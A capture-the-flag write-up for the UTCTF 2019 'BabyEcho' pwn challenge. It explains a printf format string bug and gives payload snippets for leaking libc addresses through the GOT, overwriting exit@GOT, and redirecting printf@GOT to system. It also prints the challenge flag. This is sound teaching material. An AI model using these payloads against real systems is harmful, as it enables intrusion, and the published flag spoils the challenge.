---
title: "UTCTF 2019: BabyEcho"
description: "A format string challenge that turns a single unsafe printf call into libc leaks, a GOT overwrite, and shell access."
slug: utctf-2019-babyecho
date: 2026-03-31 06:00:00+0300
categories:
    - Binary Exploitation
tags:
    - utctf
    - pwn
    - format-string
    - got
    - libc
---

## Competition

- Competition: [UTCTF 2019](https://ctftime.org/event/757)
- Challenge: [BabyEcho](https://ctftime.org/event/757/tasks/)
- Category: Pwn / Binary Exploitation

## Question

From the local archive summary, the challenge can be reduced to this prompt:

> There is a format string vulnerability that allows you to leak libc addresses and overwrite a GOT entry in order to execute `/bin/sh`.

## Flag

`utflag{gassssssssssp3r_mad3_m3_wr1t3_th1s}`

## Binary Review

The decompiled core logic is short and immediately gives away the bug:

```c
setbuf(stdin, 0);
setbuf(stdout, 0);
puts("Give me a string to echo back.");
fgets(&s, 0x32, stdin);
printf(&s);
exit(0);
```

The issue is the direct `printf(&s)` call. Since attacker-controlled input is used as the format string, we get both:

1. Arbitrary memory disclosure with `%s` and stack-controlled arguments.
2. Arbitrary writes with `%n`-style specifiers.

## Exploitation Plan

The solve path is:

1. Partially overwrite `exit@GOT` so the process does not terminate immediately.
2. Leak `setbuf@GOT` and `puts@GOT`.
3. Identify the matching libc and compute the base address.
4. Overwrite `printf@GOT` with `system`.
5. Send `cat flag.txt` so the program effectively runs `system("cat flag.txt")`.

## Key Commands

Initial triage:

```bash
checksec ./program
file ./program
```

Relevant addresses from the solve script:

```text
exit@GOT   = 0x804a01c
puts@GOT   = 0x804a018
setbuf@GOT = 0x804a00c
printf@GOT = 0x804a010
```

Run the binary against the provided loader and libc:

```bash
python exploit.py
```

## Write Primitive

The exploit first uses `%11$hn` to change the low two bytes of `exit@GOT` so program flow returns to a useful point instead of exiting cleanly. That gives us repeated interaction with the vulnerable `printf`.

The payload shape is:

```python
'AA{}%{}x%11$hn'.format(p32(exit_got), target_low_halfword - 9)
```

This is enough because only the low two bytes need to be changed for the jump target used by the solve.

## Leak Primitive

With control over format parameters, the exploit places GOT pointers inside the input and then reads them back using `%s`:

```python
'AA{}%12$sBBBB'.format(p32(setbuf_got))
'AA{}%13$sBBBB'.format(p32(puts_got))
```

Those leaks give concrete runtime addresses for libc functions. The solve then derives:

```python
libc_base = puts_addr - 0x5f140
system_addr = libc_base + 0x3a940
```

The original note also states that the identified libc was `ubuntu-xenial-amd64-libc6-i386`.

## Final GOT Overwrite

Once `system` is known, the exploit overwrites `printf@GOT` in two halfword writes:

```python
'AA{}{}%{}x%14$hn%{}x%15$hn'.format(
    p32(printf_got),
    p32(printf_got + 2),
    low_halfword_delta,
    high_halfword_delta
)
```

After this point, every future `printf(user_input)` effectively becomes:

```c
system(user_input);
```

So the final command is simply:

```bash
cat flag.txt
```

## Result

The challenge is solved by chaining a format string write, two GOT leaks, libc resolution, and a final GOT hijack of `printf` into `system`.

Final flag:

`utflag{gassssssssssp3r_mad3_m3_wr1t3_th1s}`
